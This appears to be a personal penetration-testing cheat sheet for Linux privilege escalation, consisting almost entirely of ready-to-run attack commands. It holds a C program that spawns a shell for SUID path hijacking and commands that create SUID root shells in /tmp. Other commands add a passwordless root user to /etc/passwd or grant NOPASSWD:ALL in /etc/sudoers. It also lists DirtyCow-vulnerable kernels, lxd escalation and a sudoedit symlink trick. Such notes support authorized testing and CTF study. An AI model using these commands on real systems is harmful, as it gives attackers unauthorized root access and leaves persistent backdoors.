---
description: sudo -l
---

# Linux

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" %}

### Linux

#### NFS / Sudo / Crontab / SUID / /etc/init.d

{% embed url="https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst" %}
Crontab PATH / path of command in SUID script
{% endembed %}

<pre><code><strong># service path inside suid command
</strong><strong>fakeservice.c to compile
</strong><strong>#include &#x3C;unistd.h>
</strong>int main() {
        char *args[2];
        args[0] = "/bin/sh";
        args[1] = NULL;
        execve(args[0], args, NULL);
}

or

echo "/bin/sh -p" > /tmp/service
chmod +x /tmp/service
/usr/bin/status

or
"cp /bin/bash /tmp/rootbash &#x26;&#x26; chmod +s /tmp/rootbash &#x26;&#x26; /tmp/rootbash -p;"
or
"cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh;"
or
"echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers;"
sudo bash
</code></pre>

### `find / -perm -u=s -type f 2>/dev/null`

{% hint style="info" %}
`strings` to inspect words in binary
{% endhint %}

{% embed url="https://gtfobins.github.io/" %}

#### Writable `/etc/passwd` `/etc/sudoers`

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

```
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
sudo bash
```

#### DirtyCow

{% embed url="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" %}
\#Affect kernel BEFORE the followings -
{% endembed %}

```
Centos7 /RHEL7    3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10         4.8.0-26.28
Ubuntu 16.04         4.4.0-45.66
Ubuntu 14.04         3.13.0-100.147
Debian 8                3.16.36-1+deb8u2
Debian 7                3.2.82-1

dcow.cpp -s
or cowroot
(echo 'jack ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
mv /tmp/bak /usr/bin/passwd) manual restore
```

### lxd

{% embed url="https://www.hackingarticles.in/lxd-privilege-escalation/" %}

```
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
sudo bash

echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su dummy

cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p;
```

#### sudo -l no passwd /xx/xx/xx/\*/\*/xxx.html

```
cd to /xx/xx/xx/*/*/
touch xxx.html (make a empty file)
ln -sf /etc/passwd /xx/xx/xx/*/*/xxx.html (link passwd to sudo file)
sudoedit /xx/xx/xx/*/*/xxx.html (= edit /etc/passwd)
dummy::0:0::/root:/bin/bash

or

ln -sf /etc/sudoers /xx/xx/xx/*/*/xxx.html (link sudoers to sudo file)
sudoedit /xx/xx/xx/*/*/xxx.html (= edit /etc/sudoers)
user ALL=(ALL) NOPASSWD:ALL
```
